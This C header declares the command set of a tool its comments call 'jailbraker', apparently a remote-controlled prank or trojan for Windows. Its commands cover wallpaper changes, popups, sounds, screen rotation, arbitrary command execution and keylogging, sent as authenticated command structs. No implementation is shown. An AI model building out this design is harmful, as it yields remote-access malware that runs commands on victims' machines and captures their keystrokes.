#ifndef FUN
#define FUN

#include "../Main.h"

/*
    **********************
    * JB_Instruction set *
    **********************

    --optional arguments are market with -opt
    --instructions with no args have (void)
    --i:arg -> integer,  s:arg -> string
    -- -WIP -> Work In Progress

    JB_FUN      (void)
    JB_DEACTIVE (void)
    JB_REMOVE   (void)  -WIP 

    JB_VOLUME   [i:vol] -WIP
    JB_SZAMBO   [s:soundFile]

    JB_SETWALL  [s:walpPath]
    JB_SAVEWALL (void)
    JB_LOADWALL (void)

    JB_LINKMAKE [i:linkCount-opt def:100]
    JB_LINKDEL  (void)

    JB_OPENWEB  [s:site]
    JB_CDEJECT  (void)  -WIP
    JB_POPUPW   [s:msg] [s:wTitle-opt def:JB]
    JB_POPUPA   [s:msg] [s:wTitle-opt def:JB]
    JB_EXEC     [s:cmd] -WIP
    JB_ROTATESCR[i:angle] (0-default, 1-90deg, 2-180deg, 3-270deg)  -WIP
    JB_CHANGERES[i:res] -WIP
    JB_LOGKEYS  (void)  -WIP
*/

typedef enum {
    /* --- Templates --- */
    JB_FUN,         // FUN
    JB_DEACTIVE,    // Deactive jailbraker
    JB_REMOVE,      // Delete from pc completely

    /* --- Sounds --- */
    JB_VOLUME,      // set system volume
    JB_SZAMBO,      // play sound

    /* --- Wallpaper --- */
    JB_SETWALL,     // set wallpaper to an image
    JB_SAVEWALL,    // save current wallpaper
    JB_LOADWALL,    // load saved wallpaper

    /* --- Shortcuts --- */
    JB_LINKMAKE,    // create desktop shortcuts to onestop.midi
    JB_LINKDEL,     // delete all shortcuts

    /* --- Other --- */
    JB_OPENWEB,     // Open website in default browser
    JB_CDEJECT,     // Eject disk drive
    JB_POPUPW,      // MessageBoxW
    JB_POPUPA,      // MessageBoxA
    JB_EXEC,        // execute a cmdlet
    JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
    JB_CHANGERES,   // set screen resolution
    JB_LOGKEYS      // keylogging bruh.
} JB_Instruction;

typedef struct {
    char auth[AUTH_LENGTH];
    JB_Instruction cmd;     // JB_POPUP "Title¿"Polskie szamba liderem są w kraju"\0"
    char args[CMD_ARGSZ];
} JBCMD; // JailBreaker Command

void execCommand(JBCMD cmd); // star of the show

#endif